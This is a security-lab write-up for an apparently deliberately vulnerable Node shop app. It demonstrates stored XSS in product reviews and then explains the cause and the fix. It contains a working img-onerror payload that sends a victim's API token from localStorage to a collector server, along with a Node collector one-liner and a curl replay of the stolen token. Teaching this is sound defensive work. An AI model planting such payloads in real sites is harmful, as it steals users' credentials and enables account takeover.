# Lab 05: Stored XSS + API token theft

Review bodies render unescaped (`<%- %>`) on every product page. A review is stored once and fires for every visitor — so a single post can harvest API tokens from `localStorage`.

**OWASP Top 10:2025:** [A05 Injection](https://owasp.org/Top10/2025/) / A07 Authentication Failures

**Code:** `views/product_detail.ejs` (`<%- r.body %>`), `routes/shop.js` (`/products/:id/reviews`), `public/js/app.js` (token in `localStorage`)

## Exploit

1. Log in as **alice**, generate her API token on **Account** (so `localStorage` holds one).
2. Log in as **bob**, post this review on any product (here product 3):

```html
<img src=x onerror="fetch('http://localhost:8890/steal?t='+localStorage.nodebazaar_token)">
```

3. Run a collector on your machine:

```bash
node -e "require('http').createServer((q,s)=>{console.log(decodeURIComponent(q.url));s.end('ok')}).listen(8890)"
```

4. Alice opens `http://localhost:8888/products/3`. The payload fires in her browser and her token lands in the collector:

```text
/steal?t=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6...
```

5. The token authenticates as alice against `/api/v1/*`:

```bash
curl -s http://localhost:8888/api/v1/me -H "Authorization: Bearer <stolen>"
```

Note the script-free payload: an `<img onerror>` bypasses naive `<script>` filtering.

## Why it happens

`<%- %>` outputs raw HTML; user content is never escaped. And the token is readable by page JavaScript, so injection → account takeover.

## Fix

Two layers, both needed:

```ejs
<%-- views/product_detail.ejs --%>
<p><%= r.body %></p>   <%-- <%= escapes; <%- does not --%>
```

And keep bearer tokens out of `localStorage` (readable by any injected script). Prefer the HttpOnly session cookie; if an API token is unavoidable, keep it short-lived and scoped.

## Verify

After the fix, the payload renders as text and the collector stays silent.